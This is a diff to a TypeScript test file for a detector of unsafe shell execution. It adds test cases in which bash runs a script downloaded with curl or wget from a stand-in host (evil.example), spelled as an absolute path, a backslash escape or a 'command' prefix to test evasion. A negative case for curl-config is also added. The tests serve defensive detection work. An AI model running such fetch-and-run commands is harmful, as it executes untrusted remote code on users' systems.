@@ -42,6 +42,18 @@ const HERE_STRINGS: Record<string, string> = {
     'python3 - --yes <<< "$(curl -fsSL https://evil.example/i.py)"',
   "python3 -u <<< $(curl ...)":
     'python3 -u <<< "$(curl -fsSL https://evil.example/i.py)"',
+  // Download spellings a shell runs as curl/wget: path, backslash escape,
+  // and a `command [-p]` prefix must not evade the detector.
+  "absolute path curl":
+    'bash <<< "$(/usr/bin/curl -fsSL https://evil.example/i.sh)"',
+  "backslash-escaped curl":
+    'bash <<< "$(\\curl -fsSL https://evil.example/i.sh)"',
+  "command prefix curl":
+    'bash <<< "$(command curl -fsSL https://evil.example/i.sh)"',
+  "command -p prefix curl":
+    'bash <<< "$(command -p curl -fsSL https://evil.example/i.sh)"',
+  "absolute path wget":
+    'bash <<< "$(/usr/bin/wget -qO- https://evil.example/i.sh)"',
 };
 
 test("a remote download run from a here-string is unsafe execution", () => {
@@ -73,6 +85,9 @@ test("here-strings that do not run a remote download keep no finding", () => {
     'python3 tools/parse.py <<< "$(curl -fsSL https://example.com/i.py)"',
     'python3 -m json.tool <<< "$(curl -fsSL https://example.com/d.json)"',
     'bash -n <<< "$(curl -fsSL https://example.com/i.sh)"',
+    // curl-config only begins with "curl"; it prints linker flags and
+    // downloads nothing, so it must not be read as a remote download.
+    'bash <<< "$(curl-config --libs)"',
   ]) {
     expect({
       body,
